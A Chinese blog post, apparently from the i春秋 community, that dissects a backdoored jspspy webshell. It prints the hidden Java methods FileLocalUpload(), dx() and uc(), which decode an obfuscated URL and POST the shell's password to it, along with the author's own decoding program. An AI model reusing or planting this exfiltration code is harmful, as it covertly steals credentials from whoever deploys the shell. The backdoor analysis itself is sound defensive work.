@@ -1,0 +1,30 @@
+本文作者i春秋作家——非主流
+存在后门的webshell地址
+follow me
+我们咋一看这不就是jspspy嘛
+年轻人不要急我们先把整个项目download下来然后再好好分析看看通过文件大小比较x7.jsp和下面的xia.jsp发现x7.jsp比xia.jsp多了2kb已知xia.jsp也是一个版本的jspspy。
+但是当我们分别打开x7.jsp和xia.jsp时试图想找到是哪里多出来2kb时发现有点不切实际作为一个java的初学者我们似乎并没有那么大的本事去通读jspspy的各个功能模块的代码。于是乎我们可以通过windows自带的命令去进行文本内容比较(emmmm,类似于linux下的diff命令)
+利用管道符号将两个jsp不同的地方重定向输出至txt文档中。
+打开txt我们便开始分析很突然就发现有一个问题如下图
+请注意txt文档的23行的代码x7.jsp中又定义了一个变量sxm值就是PW的值。
+那我们开始着重分析一下x7.jsp中新定义的这个sxm变量是拿来干什么的吧。
+接着用编辑器直接ctrl+f在当前文件中查找sxm
+直接转向854行
+发现有三个新的方法(就是C语言里面的函数)分别是uc()、dx()和FileLocalUpload()依次去定位查看这三个方法的代码块。
+FileLocalUpload()方法
+public static String FileLocalUpload(String reqUrl,String fckal,String recvEncoding) { HttpURLConnection url_con = null; String responseContent = null; try { URL url = new URL(reqUrl); url_con = (HttpURLConnection) url.openConnection(); url_con.setRequestMethod("POST"); url_con.setRequestProperty("REFERER", ""+fckal+""); System.setProperty("sun.net.client.defaultConnectTimeout", String.valueOf(connectTimeOut)); System.setProperty("sun.net.client.defaultReadTimeout", String.valueOf(readTimeOut)); url_con.setDoOutput(true); url_con.getOutputStream().flush(); url_con.getOutputStream().close(); InputStream in = url_con.getInputStream(); BufferedReader rd = new BufferedReader(new InputStreamReader(in,recvEncoding)); String tempLine = rd.readLine(); StringBuffer tempStr = new StringBuffer(); String crlf=System.getProperty("line.separator"); while (tempLine != null) { tempStr.append(tempLine); tempStr.append(crlf); tempLine = rd.readLine(); } responseContent = tempStr.toString(); rd.close(); in.close(); } catch (IOException e) { } finally { if (url_con != null) { url_con.disconnect(); } } return responseContent; }
+dx()方法
+public static String SysInfo="=?./..//:"; public static String dx() { String s = new String(); for (int i = SysInfo.length() - 1; i >= 0; i--) { s += SysInfo.charAt(i); } return s; }
+uc()方法
+public static String uc(String str) { String c="
+\r"; long d=127, f=11, j=12, h=14, m=31, r=83, k=1, n=8, s=114, u=-5, v=5,a=0; StringBuffer sb = new StringBuffer(); char[] ch = str.toCharArray(); for (int i = 0; i < ch.length; i++) { a = (int)ch[i]; if(a==d) a=13; if(a==f) a=10; if(a==j) a=34; if((a>=h) && (a<=m)) a=a+r; if((a>=k) && (a<=n)) a=a+s; if((a>=53) && (a<=57)) a=a+u; if((a>=48) && (a<=52)) a=a+v; sb.append((char)a); } return sb.toString(); }
+怎么办看不懂啊。
+不要慌~~ 看不懂不要紧我们可以直接把方法拿过来再处理一次只不过我不用FileLocalUpload()方法去处理我直接把sxm变量和uc()、dx()执行之后print输出就行。所以自己写写代码
+import java.io.*; import java.util.*; class x7 { public static void main(String[] args) { String PW = "ttttt"; String sxm=PW; System.out.println(uc(dx())+sxm); } public static String dx() { String s = new String(); String SysInfo="=?./..//:"; for (int i = SysInfo.length() - 1; i >= 0; i--) { s += SysInfo.charAt(i); } return s; } public static String uc(String str) { String c="
+\r"; long d=127, f=11, j=12, h=14, m=31, r=83, k=1, n=8, s=114, u=-5, v=5,a=0; StringBuffer sb = new StringBuffer(); char[] ch = str.toCharArray(); for (int i = 0; i < ch.length; i++) { a = (int)ch[i]; if(a==d) a=13; if(a==f) a=10; if(a==j) a=34; if((a>=h) && (a<=m)) a=a+r; if((a>=k) && (a<=n)) a=a+s; if((a>=53) && (a<=57)) a=a+u; if((a>=48) && (a<=52)) a=a+v; sb.append((char)a); } return sb.toString(); } }
+写完调试一下然后javac编译一下发现不报错就行。
+接着执行一次看看
+哇狗比
+写在最后
+能不能像个黑客一样不要到处要东西除非你想做那个被大鱼吃的小鱼。
+>>>>>>黑客入门必备技能 带你入坑和逗比表哥们一起聊聊黑客的事儿他们说高精尖的技术比农药都好玩
